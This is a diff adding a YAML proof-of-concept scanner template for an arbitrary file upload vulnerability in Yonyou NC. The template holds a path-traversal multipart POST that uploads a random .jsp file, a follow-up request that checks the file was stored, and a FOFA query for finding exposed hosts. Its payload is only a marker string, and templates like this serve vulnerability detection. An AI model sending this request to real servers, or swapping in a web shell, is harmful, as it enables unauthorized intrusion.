@@ -1,0 +1,38 @@
+id: poc-yaml-yongyou-nc-uploadControl-anyfile-upload
+info:
+  name: 用友 NC uploadControl 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_str(4)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /mp/initcfg/../uploadControl/uploadFile
+  headers:
+    Content-Type: multipart/form-data; boundary=21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+  data: '--21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+
+    Content-Disposition: form-data; name="submit"
+
+
+    上传
+
+    --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.jsp"
+
+    Content-Type: text/plain; charset=utf-8
+
+
+    {{.t2}}
+
+    --21e783bad5d805d7b2fe3e5ef7de7e6b0ed13740d4679092487968736c4c--'
+  expression: status_code == 200 && contains(body,`{"forbidden":true,"msg":"null"}`)
+- method: GET
+  path: /mp/uploadFileDir/{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
